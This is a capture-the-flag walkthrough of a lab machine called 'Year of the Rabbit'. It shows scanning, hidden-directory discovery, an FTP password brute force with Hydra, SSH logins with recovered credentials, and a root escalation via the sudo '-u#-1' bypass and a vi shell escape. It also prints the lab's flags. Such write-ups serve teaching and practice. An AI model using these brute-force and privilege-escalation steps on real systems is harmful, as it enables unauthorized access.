# Year of the Rabbit

First check if the machine is accessible or not
❯ ping 10.49.179.110
PING 10.49.179.110 (10.49.179.110) 56(84) bytes of data.
64 bytes from 10.49.179.110: icmp_seq=1 ttl=62 time=184 ms
64 bytes from 10.49.179.110: icmp_seq=2 ttl=62 time=106 ms
^C
--- 10.49.179.110 ping statistics ---
3 packets transmitted, 2 received, 33.3333% packet loss, time 2003ms
rtt min/avg/max/mdev = 105.658/144.768/183.879/39.110 ms


Then I used rustscan to check for open ports (cause its faster than nmap)
❯ rustscan -a 10.49.179.110
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/home/luffy/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.49.179.110:21
Open 10.49.179.110:22
Open 10.49.179.110:80
[~] Starting Script(s)
[~] Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-24 12:02 +0600
Initiating Ping Scan at 12:02
Scanning 10.49.179.110 [2 ports]
Completed Ping Scan at 12:02, 0.14s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:02
Completed Parallel DNS resolution of 1 host. at 12:02, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:02
Scanning 10.49.179.110 [3 ports]
Discovered open port 22/tcp on 10.49.179.110
Discovered open port 80/tcp on 10.49.179.110
Discovered open port 21/tcp on 10.49.179.110
Completed Connect Scan at 12:02, 0.11s elapsed (3 total ports)
Nmap scan report for 10.49.179.110
Host is up, received conn-refused (0.13s latency).
Scanned at 2026-06-24 12:02:27 +06 for 0s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds


Then I used nmap for further enum on those epecific open ports
❯ nmap -sC -sV -p21,22,80 10.49.179.110 -oN nmap.txt
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-24 12:03 +0600
Nmap scan report for 10.49.179.110
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.79 seconds


Since it is running an web server so I tried to access it
It is running an  Apache2 Debian Default Page 

Then I tried to use gobuster to search for hidden directories:
❯ gobuster dir -u http://10.49.179.110/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.179.110/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 278]
.hta                 (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
assets               (Status: 301) [Size: 315] [--> http://10.49.179.110/assets/]
index.html           (Status: 200) [Size: 7853]
server-status        (Status: 403) [Size: 278]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================\

Went to /assets/ and found a style.css file and found this  
/* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
When I went to go to /sup3r_s3cr3t_fl4g.php it says i need to disable javascript. Then I disabled javascript and again tried to access that page But didn't found anything useful

Then I captured that request in burpsuite and got this hidden directory
```
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
Host: 10.49.179.110
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```
Then I went to http://10.49.179.110/WExYY2Cv-qU/ and got one file:
[IMG]	Hot_Babe.png	2020-01-23 00:34 	464K	 

Then I downloaded that flag and used strings and got this
```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```
Got the ftp username and some list of password
So we can bruteforce this using hydra
```
hydra -l ftpuser -P passlist.txt ftp://10.49.179.110 -t 4
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-24 13:22:21
[DATA] max 4 tasks per 1 server, overall 4 tasks, 82 login tries (l:1/p:82), ~21 tries per task
[DATA] attacking ftp://10.49.179.110:21/
[21][ftp] host: 10.49.179.110   login: ftpuser   password: 5iez1wGXKfPKQ
[STATUS] 82.00 tries/min, 82 tries in 00:01h, 1 to do in 00:01h, 3 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-24 13:23:24
```

Now login using those credentials
```
❯ ftp 10.49.179.110
Connected to 10.49.179.110.
220 (vsFTPd 3.0.2)
Name (10.49.179.110:luffy): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp> get Eli's_Creds.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
226 Transfer complete.
758 bytes received in 0.0002 seconds (3.2071 Mbytes/s)
ftp> quit
221 Goodbye.
❯ ls
 "Eli's_Creds.txt"   nmap.txt       RickRolled.mp4
 Hot_Babe.png        passlist.txt
```
```
❯ cat Eli\'s_Creds.txt
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```
Looks like brainfuck code. Lets decode this:
```
User: eli
Password: DSpDiM1wAEwid
```

Lets use this to connect via ssh:
```
❯ ssh eli@10.49.179.110
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
eli@10.49.179.110's password: 


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE




eli@year-of-the-rabbit:~$ 
```
Then I did some basic enums:
```
eli@year-of-the-rabbit:~$ file *
core:      ELF 64-bit LSB core file x86-64, version 1 (SYSV), too many program headers (352)
Desktop:   directory
Documents: directory
Downloads: directory
Music:     directory
Pictures:  directory
Public:    directory
Templates: directory
Videos:    directory
eli@year-of-the-rabbit:~$ ls -al
total 656
drwxr-xr-x 16 eli  eli    4096 Jan 23  2020 .
drwxr-xr-x  4 root root   4096 Jan 23  2020 ..
lrwxrwxrwx  1 eli  eli       9 Jan 23  2020 .bash_history -> /dev/null
-rw-r--r--  1 eli  eli     220 Jan 23  2020 .bash_logout
-rw-r--r--  1 eli  eli    3515 Jan 23  2020 .bashrc
drwxr-xr-x  8 eli  eli    4096 Jan 23  2020 .cache
drwx------ 11 eli  eli    4096 Jan 23  2020 .config
-rw-------  1 eli  eli  589824 Jan 23  2020 core
drwxr-xr-x  2 eli  eli    4096 Jan 23  2020 Desktop
drwxr-xr-x  2 eli  eli    4096 Jan 23  2020 Documents
drwxr-xr-x  2 eli  eli    4096 Jan 23  2020 Downloads
drwx------  3 eli  eli    4096 Jan 23  2020 .gconf
drwx------  2 eli  eli    4096 Jan 23  2020 .gnupg
-rw-------  1 eli  eli    1098 Jan 23  2020 .ICEauthority
drwx------  3 eli  eli    4096 Jan 23  2020 .local
drwxr-xr-x  2 eli  eli    4096 Jan 23  2020 Music
drwxr-xr-x  2 eli  eli    4096 Jan 23  2020 Pictures
-rw-r--r--  1 eli  eli     675 Jan 23  2020 .profile
drwxr-xr-x  2 eli  eli    4096 Jan 23  2020 Public
drwx------  2 eli  eli    4096 Jan 23  2020 .ssh
drwxr-xr-x  2 eli  eli    4096 Jan 23  2020 Templates
drwxr-xr-x  2 eli  eli    4096 Jan 23  2020 Videos
eli@year-of-the-rabbit:~$ whoami
eli
eli@year-of-the-rabbit:~$ pwd
/home/eli
eli@year-of-the-rabbit:~$
```

According to the root message when i logged in , I used :
```
eli@year-of-the-rabbit:~$ find / -iname "*s3cr3t*" 2>/dev/null
/var/www/html/sup3r_s3cr3t_fl4g.php
/usr/games/s3cr3t
eli@year-of-the-rabbit:~$ cd /usr/games/s3cr3t
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -al
total 12
drwxr-xr-x 2 root root 4096 Jan 23  2020 .
drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
eli@year-of-the-rabbit:/usr/games/s3cr3t$ 
```
got another users pass. So connect to ssh as this new user.
```
❯ ssh gwendoline@10.49.179.110
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
gwendoline@10.49.179.110's password: 


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE




gwendoline@year-of-the-rabbit:~$ ls
user.txt
gwendoline@year-of-the-rabbit:~$ cat user.txt
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
gwendoline@year-of-the-rabbit:~$
```

Got the user flag

Now lets check for root flag.
Used some basic enums:
```
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
gwendoline@year-of-the-rabbit:~$ id && pwd
uid=1001(gwendoline) gid=1001(gwendoline) groups=1001(gwendoline)
/home/gwendoline

```

Test 1: The classic -u#-1 trick

On some older versions of Sudo:

sudo -u#-1 vi /home/gwendoline/user.txt

Explanation:

-1 as signed integer
      ↓
stored as unsigned int internally
      ↓
becomes 4294967295
      ↓
older sudo bugs could resolve weirdly to root

Inside vi:

:!id

If lucky:

uid=0(root)

this works man

:!bash
root@year-of-the-rabbit:/home/gwendoline# ls
user.txt
root@year-of-the-rabbit:/home/gwendoline# cd /root
root@year-of-the-rabbit:/root# ls
root.txt
root@year-of-the-rabbit:/root# cat root.txt
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}

got the root flag.
